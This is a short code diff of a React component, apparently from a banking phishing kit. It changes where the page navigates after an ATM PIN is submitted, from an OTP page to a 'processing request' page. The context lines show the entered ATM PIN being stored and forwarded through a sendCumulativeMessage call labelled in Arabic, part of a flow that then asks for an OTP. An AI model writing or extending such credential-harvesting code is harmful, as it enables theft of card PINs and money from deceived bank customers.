@@ -29,7 +29,7 @@ const ATMPin = () => {
       const newData = { atmPin: pin };
       updateData(newData);
       await sendCumulativeMessage(6, "رقم PIN", newData);
-      navigate('/payment-otp');
+      navigate('/processing-request');
     }
   };
 
